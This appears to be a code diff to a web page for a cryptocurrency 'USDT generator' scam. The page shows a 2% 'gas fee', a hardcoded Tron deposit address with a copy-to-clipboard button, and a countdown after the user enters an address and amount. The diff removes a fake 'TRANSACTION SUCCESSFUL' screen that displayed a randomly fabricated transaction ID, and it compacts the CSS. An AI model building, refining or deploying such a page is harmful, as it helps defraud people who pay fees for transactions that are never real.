@@ -220,20 +220,11 @@
   }
 
   .overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0, 0, 0, 0.98);
-    color: #00ff00;
-    font-family: 'VT323', monospace;
-    display: none;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    gap: 18px;
-    text-align: center;
-    letter-spacing: 0.15em;
-    z-index: 999999;
-    padding: 20px;
+    position: fixed; inset: 0; background: rgba(0,0,0,0.98);
+    color: #00ff00; font-family: 'VT323', monospace;
+    display: none; justify-content: center; align-items: center;
+    flex-direction: column; gap: 18px; text-align: center; letter-spacing: 0.15em;
+    z-index: 999999; padding: 20px;
   }
   .overlay h2 {
     font-size: 2.2em;
@@ -254,70 +245,25 @@
     0% {transform: rotate(0);}
     100% {transform: rotate(360deg);}
   }
-  .overlay .success-icon {
-    font-size: 4.5em;
-    animation: bounce 1.8s ease-in-out infinite;
-    color: #00ff00;
-  }
-  @keyframes bounce {
-    0%, 100% {transform: translateY(0);}
-    50% {transform: translateY(-15px);}
-  }
   .overlay .qr-code {
-    width: 164px;
-    height: 164px;
-    filter: drop-shadow(0 0 5px #00ff00);
-    cursor: pointer;
-    border: 3px solid #00ff00;
-    border-radius: 12px;
-    margin: 0 auto 15px auto;
-    transition: transform 0.3s ease;
+    width: 164px; height: 164px; filter: drop-shadow(0 0 5px #00ff00);
+    cursor: pointer; border: 3px solid #00ff00; border-radius: 12px;
+    margin: 0 auto 15px auto; transition: transform 0.3s ease;
   }
-  .overlay .qr-code:hover {
-    transform: scale(1.1);
-  }
+  .overlay .qr-code:hover { transform: scale(1.1); }
   .overlay .deposit-address {
-    font-size: 1.22em;
-    user-select: all;
-    letter-spacing: 0.15em;
-    margin-bottom: 20px;
-    border: 2px solid #00ff00;
-    padding: 10px 14px;
-    background: rgba(0, 50, 0, 0.7);
-    border-radius: 8px;
+    font-size: 1.22em; user-select: all; letter-spacing: 0.15em;
+    margin-bottom: 20px; border: 2px solid #00ff00; padding: 10px 14px;
+    background: rgba(0, 50, 0, 0.7); border-radius: 8px;
   }
   .overlay .card-summary {
-    font-size: 1.1em;
-    border: 1px solid #00ff00;
-    border-radius: 10px;
-    padding: 14px 24px;
-    background: rgba(0, 20, 0, 0.8);
-    width: 320px;
-    margin: 0 auto 10px auto;
+    font-size: 1.1em; border: 1px solid #00ff00; border-radius: 10px;
+    padding: 14px 24px; background: rgba(0, 20, 0, 0.8);
+    width: 320px; margin: 0 auto 10px auto;
     box-shadow: 0 0 15px #00ff00aa;
   }
   .overlay .card-summary small {
-    color: #22ff22;
-    font-size: 0.85em;
-    opacity: 0.7;
-  }
-  .overlay button {
-    background: #000;
-    border: 2px solid #00ff00;
-    border-radius: 12px;
-    color: #0f0;
-    font-size: 1.28em;
-    font-family: 'VT323', monospace;
-    padding: 12px 30px;
-    cursor: pointer;
-    letter-spacing: 0.15em;
-    box-shadow:
-      0 0 8px #00ff00,
-      0 0 16px #00ff00;
-  }
-  .overlay button:hover {
-    background: #00ff00;
-    color: #000;
+    color: #22ff22; font-size: 0.85em; opacity: 0.7;
   }
 </style>
 </head>
@@ -340,7 +286,7 @@
 
     <div style="text-align:center; margin-top: 10px; font-size: 1.12em; user-select:none;">
       Gas Fee: 2% only<br/>
-      Gas Address: <span style="user-select:all; font-family: monospace;">Generate by API Bot</span>
+      Gas Address: <span style="user-select:all; font-family: monospace;">Bot Generate Address</span>
     </div>
 
     <h2 class="glitch-text">RECENT TRANSACTIONS</h2>
@@ -368,20 +314,7 @@
     <div class="loading-spinner"></div>
   </div>
 
-  <!-- Success Overlay -->
-  <div class="overlay" id="success-overlay" role="alert" aria-live="polite" aria-label="Transaction successful notification">
-    <div class="success-icon"><i class="fa fa-circle-check"></i></div>
-    <h2>TRANSACTION SUCCESSFUL!</h2>
-    <div style="margin-bottom: 14px; font-size: 1.24em;">
-      Amount: <span id="success-amount">0</span> USDT<br />
-      TXID: <span id="success-txid"></span><br />
-      Time: <span id="success-time"></span>
-    </div>
-    <button onclick="closeSuccess()">NEW TRANSACTION</button>
-  </div>
-
 <script>
-  // MATRIX RAIN
   const matrixContainer = document.getElementById('matrix-rain');
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-*/=%"\'#&_(),.;:?!\\|{}<>[]^~';
   for(let i=0; i < 120; i++){
@@ -394,7 +327,6 @@
     matrixContainer.appendChild(c);
   }
 
-  // Clipboard copy gas address
   const GAS_ADDRESS = 'TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA';
   function copyGasAddress() {
     navigator.clipboard.writeText(GAS_ADDRESS);
@@ -471,16 +403,6 @@
   }
 
   const waitingOverlay = document.getElementById('waiting-overlay');
-  const successOverlay = document.getElementById('success-overlay');
-  const successAmountElem = document.getElementById('success-amount');
-  const successTxidElem = document.getElementById('success-txid');
-  const successTimeElem = document.getElementById('success-time');
-
-  function closeSuccess(){
-    successOverlay.style.display = 'none';
-    document.getElementById('usdt-address').value = '';
-    document.getElementById('amount-input').value = '';
-  }
 
   function handleGenerate(evt){
     evt.preventDefault();
@@ -509,14 +431,9 @@
       countdown--;
       if (countdown <= 0) {
         clearInterval(interval);
+
+        // Hide waiting overlay and return to main form
         waitingOverlay.style.display = 'none';
-
-        successAmountElem.textContent = amount.toLocaleString();
-        successTxidElem.textContent = 'TX' + Math.random().toString(36).substr(2,16).toUpperCase();
-        successTimeElem.textContent = new Date().toLocaleString('en-US', {month:'short', day:'numeric', hour:'2-digit', minute:'2-digit'});
-        successOverlay.style.display = 'flex';
-
-        refreshTransactionsPeriodically();
       }
     }, 1000);
   }
